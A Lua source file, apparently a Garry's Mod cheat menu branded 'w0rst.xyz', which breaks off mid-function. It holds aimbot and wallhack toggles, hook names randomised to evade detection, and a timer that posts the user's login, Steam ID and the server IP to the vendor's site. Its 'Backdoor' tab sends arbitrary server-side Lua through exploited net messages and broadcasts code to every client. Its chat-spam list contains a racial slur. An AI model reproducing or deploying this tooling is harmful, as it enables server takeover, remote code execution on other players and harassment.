local wtf = {
    ['INFO'] = "w0rst.xyz - Servers-To-Fuck | ~-~\n"
}; print(wtf['INFO'])

function wtf.gString()
    local s = ""
    for i = 1, math.random(10, 220) do
        s = s .. string.char(math.random(32, 126))
    end

    return s
end

local RefreshHook = wtf.gString()
local AimbotHook = wtf.gString()
local VisualHook = wtf.gString()
local CameraHook = wtf.gString()
local RenderHook = wtf.gString()
local ThinkHook = wtf.gString()
local TickHook = wtf.gString()
local ChatHook = wtf.gString()
local ViewHook = wtf.gString()
local InfoHook = wtf.gString()
local BhopHook = wtf.gString()
local KeyHook = wtf.gString()
local SelectedNet = "NONE"
local SelectedPlr = "NONE"

wtf.enable = {
    ['Ent3DBox'] = false,
    ['FlashSpam'] = false,
    ['PhyRainbow'] = false,
    ['Tracer'] = false,
    ['Distance'] = false,
    ['Name'] = false,
    ['Weapon'] = false,
    ['Wallhack'] = false,
    ['Chams'] = false,
    ['Box3D'] = false,
    ['Box2D'] = false,
    ['Skeleton'] = false,
    ['ChatSpam'] = false,
    ['EntName'] = false,
    ['EntDistance'] = false,
    ['Aimbot'] = false,
    ['AutoFire'] = false,
    ['UseSpam'] = false,
    ['Bhop'] = false,
    ['FreeCamera'] = false,
    ['SpectatorList'] = false,
    ['SilentLock'] = false
}

wtf.color = {
    ['Tracer'] = Color(255, 255, 255),
    ['Distance'] = Color(255, 255, 255),
    ['Name'] = Color(255, 255, 255),
    ['NameDist'] = Color(255, 255, 255),
    ['Weapon'] = Color(255, 255, 255),
    ['Box2D'] = Color(255, 255, 255),
    ['Box3D'] = Color(255, 255, 255),
    ['Skeleton'] = Color(255, 255, 255),
    ['Chams'] = Color(255, 255, 255),
    ['Entity'] = Color(255, 255, 255),
    ['Fov'] = Color(255, 255, 255)
}

wtf.responses = {
    "w0rst.xyz - best gmod cheat 2021",
    "w0rst.xyz - go register or black",
    "w0rst.xyz - free aimbot + esp",
    "w0rst.xyz - get good get w0rst",
    "w0rst.xyz - get w0rst don't get funnied",
    "w0rst.xyz - wtf happend to the server",
    "w0rst.xyz - $$uff yuh$$",
    "w0rst.xyz - pasted off smeghack~",
    "w0rst.xyz - yung slappa central",
    "w0rst.xyz - true opp-steppas",
    "w0rst.xyz - Vec the holmie",
    "w0rst.xyz - Shoutout nigcord",
    "w0rst.xyz - bhop on fleak no cap",
    "w0rst.xyz - skids want our source",
    "w0rst.xyz - Tapped slave who next??",
    "w0rst.xyz - Our cheat aint ratted",
    "w0rst.xyz - wmenu what??",
    "w0rst.xyz - little fishes take the bait",
    "w0rst.xyz - owned by a non ratted cheat"
}

wtf.binds = { 
    ['Aimbot'] = 81,
    ['Menu'] = 72
}

local unload = {}
local function HookFunc(eventName, Identifier, func)
    table.insert(unload, eventName)
    unload[eventName] = Identifier
    hook.Add(eventName, Identifier, func)
end

local function Unload() 
    for k, v in ipairs(unload) do 
        hook.Remove(unload[k], unload[v])
    end

    for k, v in pairs(wtf.enable) do 
        wtf.enable[k] = false
    end
end

local function Relay()
    if not file.Exists("w0rst/login.txt", "DATA") then
        local function crash() return crash() end crash()
        return
    end

    local lp = LocalPlayer()
    local UserInfo = string.Split(file.Read("w0rst/login.txt"), ":")
    http.Post("https://w0rst.xyz/api/relay.php", {
        username=UserInfo[1],
        password=UserInfo[2],
        steam_name=lp:Name(),
        steam_id=lp:SteamID(),
        server_name=GetHostName(),
        server_ip=game.GetIPAddress() }, function(b)
        local s = string.Split(b, " ");
        if(s[1] == "a4dF91aE25c2BFD11F879e42") then
            local function crash() return crash() end crash()
        end
    end)
end

local RelayDelay = 0
HookFunc("Think", InfoHook, function()
    if CurTime() < RelayDelay then return end
    RelayDelay = CurTime() + 60
    Relay()
end)

local LogPosY = 10
local SoundPosX, SoundPosY = 17, 10
local EntOffPosY, EntOnPosY = 5, 5
local BDServerPosY, BDClientPosY = 5, 5
local PlrPosX, PlrPosY = 19, 10

surface.CreateFont('Font', {
    font = 'Open Sans', extended = false, size = 20,
    weight = 1000, blursize = 0, scanlines = 0,
    antialias = true, underline = false, italic = false,
    strikeout = false, symbol = false, rotary = false,
    shadow = true, additive = false, outline = false,
})

surface.CreateFont('Sounds', {
    font = 'Marlett', extended = false, size = 17,
    weight = 1000, blursize = 0, scanlines = 0,
    antialias = true, underline = false, italic = false,
    strikeout = false, symbol = false, rotary = false,
    shadow = true, additive = true, outline = true,
})

local RenderTarget = GetRenderTarget(wtf.gString()..os.time(), ScrW(), ScrH())
HookFunc("RenderScene", RenderHook, function(vOrigin, vAngle, vFOV )
    local view = {
        x = 0, y = 0,
        w = ScrW(), h = ScrH(),
        dopostprocess = true,
        origin = vOrigin,
        angles =  vAngle,
        fov = vFOV,
        drawhud = true,
        drawmonitors = true,
        drawviewmodel = true
    }

    render.RenderView(view)
    render.CopyTexture(nil, RenderTarget)

    cam.Start2D()
        hook.Run("AltHUDPaint")
    cam.End2D()

    render.SetRenderTarget(RenderTarget)
    return true
end)

function Log(str)
    local Frame=vgui.Create("DFrame")
    Frame:SetSize(220,30)
    Frame:SetPos(-300, LogPosY)
    Frame:SetTitle("~w0rst~ "..str)
    Frame:ShowCloseButton(false)
    Frame:SetDraggable(false)
    Frame.Paint = function(s,w,h)
        draw.RoundedBox(0,0,0,w,h,Color(30,30,30,255))
        surface.SetDrawColor(Color(15,15,15, 255))
        surface.DrawOutlinedRect(0,0,s:GetWide(),s:GetTall())
    end

    local LogTimer = wtf.gString()
    Frame:MoveTo(5, LogPosY, 1,0,0.5)
    timer.Simple(3, function()
        local x, y = Frame:GetPos()
        Frame:MoveTo(-300, y, 1, 0, 0.5);
        timer.Simple(0.5, function()
            Frame:Close()
        end)
    end)

    LogPosY=LogPosY+35
    timer.Remove(LogTimer)
    timer.Create(LogTimer, 3.5, 1, function()
        LogPosY=10
    end)
end

local Icons = {
    V="https://w0rst.xyz/script/images/visuals.png",
    P="https://w0rst.xyz/script/images/players.png",
    B="https://w0rst.xyz/script/images/backdoor.png",
    M="https://w0rst.xyz/script/images/misc.png",
    S="https://w0rst.xyz/script/images/sounds.png",
    A="https://w0rst.xyz/script/images/aimbot.png",
    E="https://w0rst.xyz/script/images/exploits.png"
}

local Materials = {}
local function Download(filename, url, callback, errorCallback)
    local path = "w0rst/images/" .. filename
    local dPath = "data/" .. path
    if (file.Exists(path, "DATA")) then return callback(dPath) end
    if (not file.IsDir(string.GetPathFromFilename(path), "DATA")) then
        file.CreateDir(string.GetPathFromFilename(path))
    end

    errorCallback = errorCallback or function(reason) end
    http.Fetch(url, function(body, size, headers, code)
    if (code ~= 200) then return errorCallback(code) end
        file.Write(path, body)
        callback(dPath)
    end, errorCallback)
end

local function IconSet(iconUrls, path, cb)
    local set = {}
    local count = 0
    local iconAmt = table.Count(iconUrls)

    for name, url in pairs(iconUrls) do
        Download((path or "") .. util.CRC(name .. url) .. "." .. string.GetExtensionFromFilename(url), url, function(path)
            set[name] = Material(path, "unlitgeneric"); count = count + 1
        if (count == iconAmt and cb) then cb(set) end
    end)
end return set
end

local function Map(tbl, fn)
  	local new = {}
  	for k, v in pairs(tbl) do
    		new[k] = fn(v, k, tbl)
    end return new
end

Materials = IconSet(Icons, "")
IconSet(Map(Icons, function(v) return end), "",
function(icons) for k, icon in pairs(icons) do Icons[k].iconMat = icon end end)

local function CheckNet(str) 
    return (util.NetworkStringToID(str) > 0) 
end

local function CheckPlr(plr)
    if (plr ~= "NONE" and Player(plr):IsValid() ~= false) then
        SelectedPlr = plr; return true
    else
        Log("Player Not Selected/Valid")
    end
end

local Menu=vgui.Create("DFrame")
Menu:SetSize(650,625)
Menu:SetTitle("")
Menu:Center()
Menu:MakePopup()
Menu:SetPaintShadow(true)
Menu:ShowCloseButton(false)
Menu:SetDraggable(true)
Menu.Paint = function(self,w,h)
    draw.RoundedBox(0,0,0,w,h,Color(30, 30, 30, 255))
    surface.SetDrawColor(40,40,40,255)
    surface.DrawOutlinedRect(0, 0, w, h)
end

local Strip=vgui.Create("DPanelList", Menu)
Strip:SetSize(620, 2.5)
Strip:SetPos(15, 14)
Strip.Paint = function(s, w, h)
    local rainbow = HSVToColor((CurTime() * 99) % 360, 1, 1)
    surface.SetDrawColor(Color(rainbow.r, rainbow.g, rainbow.b, 175))
    surface.DrawOutlinedRect(0, 0, w, h)
end

local Tab=vgui.Create("DFrame", Menu)
Tab:ShowCloseButton(false)
Tab:SetDraggable(false)
Tab:SetTitle("")
Tab:SetSize(620,580)
Tab:SetPos(15, 30)
Tab.Paint = function(self, w, h)
    surface.SetDrawColor(Color(15,15,15,255))
    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
    draw.RoundedBox(0,0,0,w,h,Color(55, 55, 55, 25))
end

local Tabs, TabButtons = {}, {}
local function CreateTabButton(mat, x, y)
    local btn, tab = wtf.gString(), wtf.gString()
    TabButtons[btn]=vgui.Create("DButton", Tab)
    TabButtons[btn]:SetSize(70,70)
    TabButtons[btn]:SetPos(x, y)
    TabButtons[btn]:SetText("")
    TabButtons[btn]:SetMaterial(mat)
    TabButtons[btn].Paint = function(self, w, h) surface.SetDrawColor(Color(0,0,0)) end
    TabButtons[btn].DoClick = function()
        for k, v in pairs(Tabs) do v:Hide() end 
        Tabs[tab]:Show()
    end

    Tabs[tab] = vgui.Create("DFrame", Tab)
    Tabs[tab]:ShowCloseButton(false)
    Tabs[tab]:SetVisible(false)
    Tabs[tab]:SetDraggable(false)
    Tabs[tab]:SetTitle("")
    Tabs[tab]:SetPos(95, 10)
    Tabs[tab]:SetSize(515, 560)
    Tabs[tab].Paint = function(self, w, h)
        draw.RoundedBox(0,0,0,w,h,Color(30,30,30,255))
        surface.SetDrawColor(Color(15,15,15,255))
        surface.DrawOutlinedRect(0,0,w,h)
    end

    return { Tabs[tab], TabButtons[btn] }
end

local function CreatePanel(tab, width, height, x, y)
    local Pannel=vgui.Create("DScrollPanel", tab)
    Pannel:SetSize(width,height)
    Pannel:SetPos(x, y)
    Pannel:GetVBar():SetWide(0)
    Pannel.Paint = function(self,w,h)
        surface.SetDrawColor(Color(15,15,15,255))
        surface.DrawOutlinedRect(0,0,w,h)
        surface.DrawOutlinedRect(0,0,w,h)
    end
    return { Pannel }
end

local function CreateButton(name, tab, width, height, x, y, func)
    Button=vgui.Create("DButton", tab)
    Button:SetSize(width, height)
    Button:SetPos(x, y)
    Button:SetText(name)
    Button.DoClick = func
    Button.Paint = function(self, w,h)
        draw.RoundedBox(0,0,0,w,h,Color(35, 35, 35, 255))
        surface.SetDrawColor(40, 40, 40, 255)
        surface.DrawOutlinedRect(0,0,w,h)
        self:SetTextColor(Color(255,255,255))
    end
end

local function SetBind(bind)
    local BlankFrame = vgui.Create("DFrame")
    BlankFrame:ShowCloseButton(false)
    BlankFrame:SetTitle("")
    BlankFrame.Paint = nil

    Log("Press Any Button")
    BlankFrame.Think = function()
        for i = 1, 103 do 
            if input.IsKeyDown(i) then
                if i == 70 then i = 0 end
                wtf.binds[bind] = i
                BlankFrame:Close()
                BlankFrame.Think = nil
                Log(bind.." Bind Set "..i)
            end
        end
    end
end

local function CreateBindableButton(name, bind, tab, x, y)
    local Frame=vgui.Create("DFrame", tab)
    Frame:SetSize(110, 25)
    Frame:SetPos(x, y)
    Frame:SetDraggable(false)
    Frame:ShowCloseButton(false)
    Frame:SetTitle("")
    Frame.Paint = function(self, w, h)
        draw.RoundedBox(0,0,0, w, h, Color(35, 35, 35, 255))
        surface.SetDrawColor(40, 40, 40, 255)
        surface.DrawOutlinedRect(0,0, w, h)
        draw.SimpleText("["..wtf.binds[bind].."]", "DermaDefault", 84, 5.15, Color(255,255,255,255))
    end

    local Button = vgui.Create("DButton", Frame)
    Button:SetSize(80, 23)
    Button:SetPos(1, 1)
    Button:SetText(name..":")
    Button.DoClick = function() SetBind(bind) end
    Button.Paint = function(self, w, h)
        draw.RoundedBox(0,0,0,w,h,Color(35, 35, 35, 255))
        self:SetTextColor(Color(255,255,255))
    end
end

local function CreateCheckbox(name, tab, x, y, func)
    local Frame=vgui.Create("DFrame", tab)
    Frame:SetSize(110, 25)
    Frame:SetPos(x, y)
    Frame:SetDraggable(false)
    Frame:ShowCloseButton(false)
    Frame:SetTitle("")
    Frame.Paint = function(self, w, h)
        draw.RoundedBox(0,0,0, w, h, Color(35, 35, 35, 255))
        surface.SetDrawColor(40, 40, 40, 255)
        surface.DrawOutlinedRect(0,0, w, h)
        draw.SimpleText(name, "DermaDefault", 25, 5, Color(255,255,255,255))
    end

    local Button = vgui.Create("DButton", Frame)
    Button:SetSize(15,15)
    Button:SetPos(5,5)
    Button:SetText("")
    Button.Paint = function(self, w, h)
        surface.SetDrawColor(30, 30, 30, 255)
        surface.DrawRect(0, 0, w, h)
        surface.SetDrawColor(30, 30, 30, 255)
        surface.DrawOutlinedRect(0,0, w, h)
    end

    local Toggled = false
    Button.DoClick = function()
        Toggled = not Toggled; func()
        if Toggled then
            Button.Paint = function(self, w, h)
                surface.SetDrawColor(25.5, 25.5, 25.5, 255)
                surface.DrawRect(0, 0, w, h)
                surface.SetDrawColor(30, 30, 30, 255)
                surface.DrawOutlinedRect(0,0, w, h)
            end
        else
            Button.Paint = function(self, w, h)
                surface.SetDrawColor(30, 30, 30, 255)
                surface.DrawRect(0, 0, w, h)
                surface.SetDrawColor(30, 30, 30, 255)
                surface.DrawOutlinedRect(0,0, w, h)
            end
        end
    end
end

local function CreateInputBox(name, func)
    local Frame = vgui.Create("DFrame")
    Frame:SetTitle("")
    Frame:SetSize(220,95)
    Frame:Center()
    Frame:MakePopup()
    Frame:ShowCloseButton(false)
    Frame:SetBackgroundBlur(true)
    Frame.Paint = function(self,w,h)
        draw.RoundedBox(0,0,0,w,h,Color(30, 30, 30, 255))
        surface.SetDrawColor(25, 25, 25, 255)
        surface.DrawOutlinedRect(0, 0, w, h)
        draw.SimpleText(name, "DermaDefault", 10, 8, Color(200,200,200,200))
    end

    local Panel = vgui.Create("DFrame", Frame)
    Panel:ShowCloseButton(false)
    Panel:SetDraggable(false)
    Panel:SetTitle(" ")
    Panel:SetSize(200, 40)
    Panel:SetPos(10, 25)
    Panel.Paint = function(self,w,h)
        draw.RoundedBox(0,0,0,w,h,Color(31, 31, 31, 230))
        surface.SetDrawColor(25, 25, 25, 255)
        surface.DrawOutlinedRect(0, 0, w, h)
    end

    local Entry = vgui.Create("DTextEntry", Panel)
    Entry:SetPos(5, 7.5)
    Entry:AllowInput()
    Entry:SetSize(190, 25)
    Entry:SetValue("")
    Entry.Paint = function(self, w, h)
        draw.RoundedBox(0,0,0,w,h,Color(33, 33, 33, 200))
        surface.SetDrawColor(25, 25, 25, 255)
        surface.DrawOutlinedRect(0,0,w,h)
        self:DrawTextEntryText(Color(255, 255, 255), Color(20, 20, 150), Color(100, 100, 100))
    end

    local AcceptButton = vgui.Create("DButton", Frame)
    AcceptButton:SetText("Accept")
    AcceptButton:SetPos(148, 70)
    AcceptButton:SetFont("DermaDefault")
    AcceptButton:SetSize(60, 20)
    AcceptButton.DoClick = function()
        func(Entry:GetValue())
        Frame:Close(); 
    end
    AcceptButton.Paint = function(self, w,h)
        draw.RoundedBox(0,0,0,w,h,Color(35, 35, 35, 255))
        surface.SetDrawColor(40, 40, 40, 255)
        surface.DrawOutlinedRect(0,0,w,h)
        self:SetTextColor(Color(255,255,255))
    end

    local CancelButton=vgui.Create("DButton", Frame)
    CancelButton:SetText("Cancel")
    CancelButton:SetSize(60, 20)
    CancelButton:SetPos(84, 70)
    CancelButton.DoClick = function() Frame:Hide() end
    CancelButton.Paint = function(self,w,h)
        draw.RoundedBox(0,0,0,w,h,Color(35, 35, 35, 255))
        surface.SetDrawColor(40, 40, 40, 255)
        surface.DrawOutlinedRect(0,0,w,h)
        self:SetTextColor(Color(255,255,255))
    end
end

local function CreateSlider(name, table, tab, max, min, x, y)
    local Frame=vgui.Create("DFrame", tab)
    Frame:SetSize(110,25)
    Frame:SetPos(x, y)
    Frame:SetDraggable(false)
    Frame:ShowCloseButton(false)
    Frame:SetVisible(true)
    Frame:SetTitle(" ")
    Frame.Paint = function(self, w,h)
        draw.RoundedBox(0,0,0, w, h, Color(35, 35, 35, 255))
        surface.SetDrawColor(40, 40, 40, 255)
        surface.DrawOutlinedRect(0,0, w, h)
        draw.SimpleText(name, "DermaDefault", 7, 5, Color(255,255,255,255))
    end

    local Slider = vgui.Create( "DNumSlider", Frame )
    Slider:SetPos(-33, 4)
    Slider:SetSize(155, 15)
    Slider:SetText("")
    Slider:SetMin(min)
    Slider:SetMax(max)
    Slider:SetDecimals(0)
    Slider:SetValue(table[1])
    Slider.Scratch:SetVisible(false)
    Slider.TextArea:SetTextColor(Color(255,255,255,255))
    function Slider.Slider.Knob:Paint(w, h) end
    Slider.OnValueChanged = function(self, value)
        table[1] = self:GetValue()
    end
    function Slider.Slider:Paint(w, h)
        local Parent = self:GetParent()
        local Drag = w * ((Parent:GetValue() - Parent:GetMin()) / Parent:GetRange())
        draw.RoundedBox(50, 0, 4, Drag, 10, Color(30, 30, 30, 255))
    end
end

local function CreateColorSlider(name, color, tab, x, y)
    local Frame=vgui.Create("DFrame", tab)
    Frame:SetSize(120,85)
    Frame:SetPos(x, y)
    Frame:SetDraggable(false)
    Frame:ShowCloseButton(false)
    Frame:SetTitle(name)
    Frame.Paint = function(self, w,h)
        draw.RoundedBox(0,0,0, w, h, Color(35, 35, 35, 255))
        surface.SetDrawColor(40, 40, 40, 255)
        surface.DrawOutlinedRect(0,0, w, h)
        draw.SimpleText("O", "DermaDefault", 105, 5, Color(color.r, color.g, color.b))
        draw.SimpleText("R:", "DermaDefault", 10, 25, Color(170,170,170,200))
        draw.SimpleText("G:", "DermaDefault", 10, 45, Color(170,170,170,200))
        draw.SimpleText("B:", "DermaDefault", 10, 65, Color(170,170,170,200))
    end

    local ColorR=vgui.Create("DNumSlider", Frame)
    ColorR:SetMin(0);
    ColorR:SetMax(255)
    ColorR:SetSize(180, 15)
    ColorR:SetPos(-50,23)
    ColorR:SetDecimals(0)
    ColorR:SetValue(color.r)
    ColorR.Scratch:SetVisible(false)
    ColorR.TextArea:SetTextColor(Color(170,170,170,200))
    function ColorR.Slider.Knob:Paint(w, h) end
    ColorR.OnValueChanged = function(self, value)
        color.r=self:GetValue()
    end
    function ColorR.Slider:Paint(w, h)
        local Parent = self:GetParent()
        local Drag = w * ((Parent:GetValue() - Parent:GetMin()) / Parent:GetRange())
        draw.RoundedBox(50, 0, 4, Drag, 10, Color(30, 30, 30, 255))
    end

    local ColorG=vgui.Create("DNumSlider", Frame)
    ColorG:SetMin(0);
    ColorG:SetMax(255)
    ColorG:SetSize(180, 15)
    ColorG:SetPos(-50,43)
    ColorG:SetDecimals(0)
    ColorG:SetValue(color.g)
    ColorG.Scratch:SetVisible(false)
    ColorG.TextArea:SetTextColor(Color(170,170,170,200))
    function ColorG.Slider.Knob:Paint(w, h) end
    ColorG.OnValueChanged = function(self, value)
        color.g=self:GetValue()
    end
    function ColorG.Slider:Paint(w, h)
        local Parent = self:GetParent()
        local Drag = w * ((Parent:GetValue() - Parent:GetMin()) / Parent:GetRange())
        draw.RoundedBox(50, 0, 4, Drag, 10, Color(30, 30, 30, 255))
    end

    local ColorB=vgui.Create("DNumSlider", Frame)
    ColorB:SetMin(0);
    ColorB:SetMax(255)
    ColorB:SetSize(180, 15)
    ColorB:SetPos(-50,63)
    ColorB:SetDecimals(0)
    ColorB:SetValue(color.b)
    ColorB.Scratch:SetVisible(false)
    ColorB.TextArea:SetTextColor(Color(170,170,170,200))
    function ColorB.Slider.Knob:Paint(w, h) end
    ColorB.OnValueChanged = function(self, value)
        color.b=self:GetValue()
    end
    function ColorB.Slider:Paint(w, h)
        local Parent = self:GetParent()
        local Drag = w * ((Parent:GetValue() - Parent:GetMin()) / Parent:GetRange())
        draw.RoundedBox(50, 0, 4, Drag, 10, Color(30, 30, 30, 255))
    end

    function Update()
        ColorR:SetValue(color.r)
        ColorG:SetValue(color.g)
        ColorB:SetValue(color.b)
    end

    external = {}
    external['Update'] = Update
    return external
end

local VisualsTab = CreateTabButton(Materials.V, 13, 5)
local MiscTab = CreateTabButton(Materials.M, 13, 85)
local PlayersTab = CreateTabButton(Materials.P, 13, 165)
local BackdoorTab = CreateTabButton(Materials.B, 13, 245)
local SoundsTab = CreateTabButton(Materials.S, 13, 325)

local PlayerPanel = CreatePanel(PlayersTab[1], 495, 540, 10, 10)
local SoundPanel = CreatePanel(SoundsTab[1], 495, 505, 10, 10)
local ServerBDPanel = CreatePanel(BackdoorTab[1], 225, 300, 20, 15)
local ClientBDPanel = CreatePanel(BackdoorTab[1], 225, 300, 270, 15)
local EntityPanel = CreatePanel(VisualsTab[1], 490, 350, 15, 190)
local EntOffPanel = CreatePanel(EntityPanel[1], 230, 330, 10, 10)
local EntOnPanel = CreatePanel(EntityPanel[1], 230, 330, 250, 10)

local ColorSliders = {
    CreateColorSlider("Tracer-Editor", wtf.color['Tracer'], MiscTab[1], 9, 280),
    CreateColorSlider("Distance-Editor", wtf.color['Distance'], MiscTab[1], 134, 280),
    CreateColorSlider("Name-Editor", wtf.color['Name'], MiscTab[1], 259, 280),
    CreateColorSlider("Weapon-Editor", wtf.color['Weapon'], MiscTab[1], 384, 280),
    CreateColorSlider("Box-2D-Editor", wtf.color['Box2D'], MiscTab[1],  9, 370),
    CreateColorSlider("Box-3D-Editor", wtf.color['Box3D'], MiscTab[1], 134, 370),
    CreateColorSlider("Skeleton-Editor", wtf.color['Skeleton'], MiscTab[1], 259, 370),
    CreateColorSlider("Chams-Editor", wtf.color['Chams'], MiscTab[1], 384, 370),
    CreateColorSlider("Entity-Editor", wtf.color['Entity'], MiscTab[1], 9, 460),
    CreateColorSlider("Fov-Editor", wtf.color['Fov'], MiscTab[1], 134, 460),
    CreateColorSlider("Name/Dist-Editor", wtf.color['NameDist'], MiscTab[1], 259, 460)
}

local EntList = {}
local function PopulateEntLists()
    local EntsOn, EntsOff = {}, {}
    function CheckTable(table, value)
        if table ~= nil then
            for i = 1, #table do
                if table[i] == value then
                    return true
                end
            end; return false
        end
    end

    for k, v in pairs(ents.GetAll()) do
        local name = v:GetClass()
        if name ~= "player" and name ~= "viewmodel" then
            if not CheckTable(EntList, name) and not CheckTable(EntsOff, name) then
                CreateButton(name, EntOffPanel[1], 220, 25, 5, EntOffPosY, function()
                    table.insert(EntList, name); ClearLists()
                end);

                table.insert(EntsOff, name)
                EntOffPosY = EntOffPosY + 26
            end

            if CheckTable(EntList, name) and not CheckTable(EntsOn, name) then
                CreateButton(name, EntOnPanel[1], 220, 25, 5, EntOnPosY, function()
                    for i = 1, #EntList do
                        if EntList[i] == name then
                            table.remove(EntList, i)
                        end
                    end; ClearLists()
                end);

                table.insert(EntsOn, name)
                EntOnPosY = EntOnPosY + 26
            end
        end
    end

    function ClearLists()
        EntOffPanel[1]:Clear(); EntOnPanel[1]:Clear()
        EntOffPosY, EntOnPosY = 5, 5
        PopulateEntLists()
    end

    external = {}
    external['Clear'] = ClearLists
    return external
end;

local EntityList = PopulateEntLists()

local function PopulatePlayers()
    for k,v in pairs(player.GetAll()) do
        local Frame = vgui.Create("DFrame", PlayerPanel[1])
        Frame:SetPos(PlrPosX, PlrPosY)
        Frame:SetSize(145, 140)
        Frame:SetTitle(" ")
        Frame:SetDraggable(false)
        Frame:ShowCloseButton(false)
        Frame.Paint = function(self, w, h)
            surface.SetDrawColor(Color(15,15,15,255))
            surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
            draw.RoundedBox(0,0,0,w,h,Color(55, 55, 55, 25))
        end

        local LabelButton = vgui.Create("DButton", Frame)
        LabelButton:SetText(v:Nick())
        LabelButton:SetColor(Color(255,255,255))
        LabelButton:SetSize(115, 30)
        LabelButton:SetPos(15, 100)
        LabelButton.Paint = function(self, w, h)
            draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(35, 35, 35, 255))
            surface.SetDrawColor(40, 40, 40, 255)
            surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
            self:SetTextColor(Color(255,255,255))
        end
        LabelButton.DoClick = function()
            if CheckPlr(v:UserID()) then
                Log("Selected "..Player(SelectedPlr):Nick())
            end
        end

        local AvatarFrame = vgui.Create("DFrame", Frame)
        AvatarFrame:SetSize(82, 82)
        AvatarFrame:SetPos(31, 10)
        AvatarFrame:SetTitle(" ")
        AvatarFrame:SetDraggable(false)
        AvatarFrame:ShowCloseButton(false)
        AvatarFrame.Paint = function(self, w, h)
            draw.RoundedBox(0,0,0,w,h,Color(0,0,0, 255))
        end

        local Avatar = vgui.Create( "AvatarImage", AvatarFrame)
        Avatar:SetSize(80, 80)
        Avatar:Center()
        Avatar:SetPlayer(v, 128)
        Avatar.Paint = function(self, w, h)
            draw.RoundedBox( 10, 0, 0, w, h, Color(255,255,255))
        end

        PlrPosX=PlrPosX+155
        if PlrPosX==484 then
            PlrPosX=19
            PlrPosY=PlrPosY+150
        end
    end
end

PopulatePlayers()
local RefreshDelay = 5
HookFunc("Think", RefreshHook, function()
    if CurTime() < RefreshDelay then return end
    if Menu:IsVisible() then 
        RefreshDelay = CurTime() + 5
        PlayerPanel[1]:GetCanvas():Clear()
        PlrPosX, PlrPosY = 19, 10
        PopulatePlayers()
    end
end)

local LuaEditor=vgui.Create("DTextEntry", BackdoorTab[1])
LuaEditor:SetPos(10, 325)
LuaEditor:AllowInput()
LuaEditor:SetSize(495, 185)
LuaEditor:SetValue("Run Lua | Server-Side")
LuaEditor:SetMultiline(true)
LuaEditor.Paint = function(self, w, h)
    surface.SetDrawColor(15, 15, 15, 255)
    surface.DrawOutlinedRect(0, 0, w, h)
    self:DrawTextEntryText(Color(255, 255, 255), Color(20, 20, 150), Color(100, 100, 100))
    self:SetFont('Trebuchet18')
end

local function SendLua(lua)
    if CheckNet(SelectedNet) then
        net.Start(SelectedNet)
        net.WriteString(lua)
        net.WriteBit(1)
        net.SendToServer()
    else
        Log("Net Not Selected")
    end
end

local function CreateBDServer(name, func)
    Button=vgui.Create("DButton", ServerBDPanel[1])
    Button:SetSize(195, 30)
    Button:SetPos(15, BDServerPosY)
    Button:SetText(name)
    Button.DoClick = function()
        if CheckNet(SelectedNet) then
            func()
        else 
            Log("No Net Selected")
        end
    end
    Button.Paint = function(self, w,h)
        draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(35, 35, 35, 255))
        surface.SetDrawColor(40, 40, 40, 255)
        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
        self:SetTextColor(Color(255,255,255))
    end

    BDServerPosY = BDServerPosY + 35
end

local function CreateBDClient(name, func)
    Button=vgui.Create("DButton", ClientBDPanel[1])
    Button:SetSize(195, 30)
    Button:SetPos(12, BDClientPosY)
    Button:SetText(name)
    Button.DoClick = function()
        if CheckNet(SelectedNet) then
            if CheckPlr(SelectedPlr) then
                func()
            end
        else
            Log("No Net Selected")
        end
    end
    Button.Paint = function(self, w,h)
        draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(35, 35, 35, 255))
        surface.SetDrawColor(40, 40, 40, 255)
        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
        self:SetTextColor(Color(255,255,255))
    end

    BDClientPosY = BDClientPosY + 35
end

local Sounds = {
    "Velvet https://w0rst.xyz/script/sounds/egovert-velvet.mp3",
    "MrMoney https://w0rst.xyz/script/sounds/shotgunwilly-mrmoney.mp3",
    "GoLoko https://w0rst.xyz/script/sounds/tyga-goloko.mp3",
    "BadBoy https://w0rst.xyz/script/sounds/yungbae-badboy.mp3",
    "RooDoo https://w0rst.xyz/script/sounds/bbno$-roodoo.mp3",
    "SingleSummer https://w0rst.xyz/script/sounds/gyyps-singleforthesummer.mp3",
    "Quiting https://w0rst.xyz/script/sounds/khary-quitting.mp3",
    "DoubtIt https://w0rst.xyz/script/sounds/kyle-doubtit.mp3",
    "Hex https://w0rst.xyz/script/sounds/80purp-hex.mp3",
    "DownBad https://w0rst.xyz/script/sounds/jcole-downbad.mp3",
    "JustTheTwoOfUs https://w0rst.xyz/script/sounds/groverwashington-justthetwoofus.mp3",
    "StillCreeping https://w0rst.xyz/script/sounds/chuuwee-still-creeping.mp3",
    "BeLazy https://w0rst.xyz/script/sounds/skizzymars-be-lazy.mp3",
    "Hope https://w0rst.xyz/script/sounds/Hope.mp3",
    "Prices https://w0rst.xyz/script/sounds/prices.mp3",
    "51DeadOps https://w0rst.xyz/script/sounds/51deadops.mp3"
}

for i = 1, #Sounds do
    local Song = string.Split(Sounds[i], " ") 
    local Button = vgui.Create("DButton", SoundPanel[1])
    Button:SetSize(145,100)
    Button:SetText(Song[1])
    Button:SetFont("Sounds")
    Button:SetPos(SoundPosX, SoundPosY)
    Button.Paint = function(self, w,h)
        draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(35, 35, 35, 255))
        surface.SetDrawColor(40, 40, 40, 255)
        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
        self:SetTextColor(Color(155,155,155))
    end
    Button.DoClick = function()
        if CheckNet(SelectedNet) then
            SendLua([[BroadcastLua("sound.PlayURL(']]..Song[2]..[[','mono',function(station) station:Play() end)")]])
            Log("Sent Sound: "..Song[1]);
        else
            Log("No Net Selected"); 
        end
    end
    SoundPosX=SoundPosX+158
    if SoundPosX==491 then
        SoundPosX=17
        SoundPosY=SoundPosY+110
    end
end

local FreeCamera = {}
FreeCamera.ViewOrigin = Vector(0,0,0)
FreeCamera.ViewAngle = Angle(0,0,0)
FreeCamera.Velocity = Vector(0,0,0)
FreeCamera.SetView = false
FreeCamera.Speed = .97

HookFunc("CalcView", CameraHook, function(ply, origin, angles, fov)
    if not wtf.enable['FreeCamera'] then return end
    if FreeCamera.SetView then
